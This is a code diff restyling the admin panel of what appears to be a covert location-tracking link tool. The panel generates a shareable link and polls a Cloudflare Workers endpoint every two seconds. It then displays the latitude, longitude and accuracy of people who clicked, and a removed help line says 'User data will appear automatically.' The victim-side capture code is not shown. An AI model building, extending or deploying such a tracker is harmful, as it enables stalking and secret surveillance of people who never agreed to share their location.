@@ -6,21 +6,31 @@
 
 <style>
 *{box-sizing:border-box}
-body{
+html,body{
   margin:0;
-  font-family:system-ui, -apple-system, BlinkMacSystemFont;
-  background:#2b2b2b;
-  display:flex;
-  justify-content:center;
-  padding:40px 0;
+  width:100%;
+  height:100%;
+  font-family:system-ui;
+  background:#1f2933;
 }
 
-/* PHONE FRAME */
+/* CENTER FIX */
+body{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* APP */
 .app{
   width:360px;
+  height:640px;
   background:#f4f6f8;
-  border-radius:18px;
+  border-radius:20px;
   overflow:hidden;
+  box-shadow:0 20px 40px rgba(0,0,0,.4);
+  display:flex;
+  flex-direction:column;
 }
 
 /* HEADER */
@@ -37,8 +47,7 @@ body{
   width:100%;
   height:60px;
   background:#f4f6f8;
-  border-top-left-radius:50%;
-  border-top-right-radius:50%;
+  border-radius:50% 50% 0 0;
 }
 
 /* LOGO */
@@ -47,40 +56,30 @@ body{
   bottom:-40px;
   left:50%;
   transform:translateX(-50%);
-  background:#fff;
   width:90px;
   height:90px;
   border-radius:50%;
+  background:#fff;
   display:flex;
   align-items:center;
   justify-content:center;
-  box-shadow:0 6px 14px rgba(0,0,0,.15);
-  font-weight:700;
+  font-weight:800;
   color:#2563eb;
+  box-shadow:0 6px 16px rgba(0,0,0,.2);
 }
 
-/* MAIN CARD */
+/* CARD */
 .card{
   background:#fff;
   margin:60px 16px 16px;
-  padding:20px;
+  padding:16px;
   border-radius:16px;
-  box-shadow:0 6px 18px rgba(0,0,0,.08);
+  box-shadow:0 6px 18px rgba(0,0,0,.1);
+  flex:1;
+  overflow:auto;
 }
 
-/* BUTTONS */
-button{
-  width:100%;
-  background:#2563eb;
-  color:#fff;
-  border:none;
-  padding:12px;
-  font-weight:600;
-  border-radius:999px;
-  cursor:pointer;
-}
-button:active{transform:scale(.98)}
-
+/* INPUT + BUTTON */
 input{
   width:100%;
   padding:12px;
@@ -89,23 +88,51 @@ input{
   margin-top:10px;
 }
 
-/* INFO SECTIONS */
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  border-radius:999px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+/* LINK BOX */
+.link-box{
+  display:flex;
+  gap:6px;
+  margin-top:10px;
+}
+.link-box input{
+  margin:0;
+}
+.copy-btn{
+  padding:0 14px;
+  border-radius:10px;
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  cursor:pointer;
+}
+
+/* SECTIONS */
 .section{
   margin-top:14px;
-  padding:14px;
+  padding:12px;
   border-radius:14px;
   border:1px solid #e5e7eb;
 }
 
 .section h4{
-  margin:0 0 8px;
+  margin:0 0 6px;
   font-size:14px;
   color:#2563eb;
-  display:flex;
-  align-items:center;
-  gap:6px;
 }
 
+/* STATUS */
 .status{
   display:flex;
   justify-content:space-between;
@@ -116,19 +143,19 @@ input{
   height:8px;
   border-radius:50%;
   background:#22c55e;
-  display:inline-block;
 }
 
-/* MAP PLACEHOLDER */
+/* MAP */
 .map{
-  height:100px;
-  background:#e5e7eb;
+  height:110px;
   border-radius:12px;
+  background:#e5e7eb;
   display:flex;
-  align-items:center;
+  flex-direction:column;
   justify-content:center;
-  color:#9ca3af;
-  font-weight:600;
+  align-items:center;
+  font-size:13px;
+  color:#374151;
 }
 
 /* USERS */
@@ -140,10 +167,11 @@ input{
   font-size:13px;
 }
 
+/* LOADER */
 .loader{
   display:none;
   text-align:center;
-  margin:10px 0;
+  margin-top:10px;
   font-weight:600;
 }
 </style>
@@ -159,8 +187,8 @@ input{
 
   <!-- LOGIN -->
   <div class="card" id="loginBox">
-    <h3 style="text-align:center;margin-top:0">Admin Login</h3>
-    <input id="pass" type="password" placeholder="Enter your key here...">
+    <h3 style="text-align:center;margin:0">Admin Login</h3>
+    <input id="pass" type="password" placeholder="Enter your key here">
     <button onclick="login()">ENTER</button>
   </div>
 
@@ -168,30 +196,25 @@ input{
   <div class="card" id="panel" style="display:none">
 
     <button onclick="generate()">GENERATE LINK</button>
-    <input id="link" placeholder="your link is here" readonly>
+
+    <div class="link-box">
+      <input id="link" readonly placeholder="your link is here">
+      <button class="copy-btn" onclick="copyLink()">📋</button>
+    </div>
 
     <div class="loader" id="loader">Loading…</div>
 
     <div class="section">
-      <h4>👤 User info</h4>
-      <div class="status">
-        <span>link clicked</span><span class="dot"></span>
-      </div>
-      <div class="status">
-        <span>active</span><span class="dot"></span>
-      </div>
+      <h4>User info</h4>
+      <div class="status"><span>link clicked</span><span class="dot"></span></div>
+      <div class="status"><span>active</span><span class="dot"></span></div>
     </div>
 
     <div class="section">
-      <h4>📍 User location</h4>
-      <div class="map">MAP HERE</div>
-    </div>
-
-    <div class="section">
-      <h4>❓ How to use?</h4>
-      <p style="font-size:12px;color:#6b7280;margin:0">
-        Generate a link and share it. User data will appear automatically.
-      </p>
+      <h4>User location</h4>
+      <div class="map" id="map">
+        Waiting for data…
+      </div>
     </div>
 
     <div id="users"></div>
@@ -202,6 +225,7 @@ input{
 <script>
 const API="https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 let sessionId=null;
+let lastCoords=null;
 
 function login(){
   fetch(API+"/login",{
@@ -233,12 +257,20 @@ function generate(){
   });
 }
 
+function copyLink(){
+  navigator.clipboard.writeText(link.value);
+  alert("Link copied!");
+}
+
 async function load(){
+  loader.style.display="block";
   const r=await fetch(API+"/admin-data");
   const data=await r.json();
   users.innerHTML="";
+
   for(const t in data){
     const u=data[t];
+    lastCoords=u;
     users.innerHTML+=`
       <div class="user">
         <b>${t}</b><br>
@@ -246,7 +278,18 @@ async function load(){
         Accuracy: ${u.acc}m
       </div>`;
   }
+
+  if(lastCoords){
+    map.innerHTML=`
+      <div><b>Latitude:</b> ${lastCoords.lat}</div>
+      <div><b>Longitude:</b> ${lastCoords.lng}</div>
+      <div><b>Accuracy:</b> ${lastCoords.acc}m</div>
+    `;
+  }
+
+  loader.style.display="none";
 }
+
 setInterval(load,2000);
 </script>
 
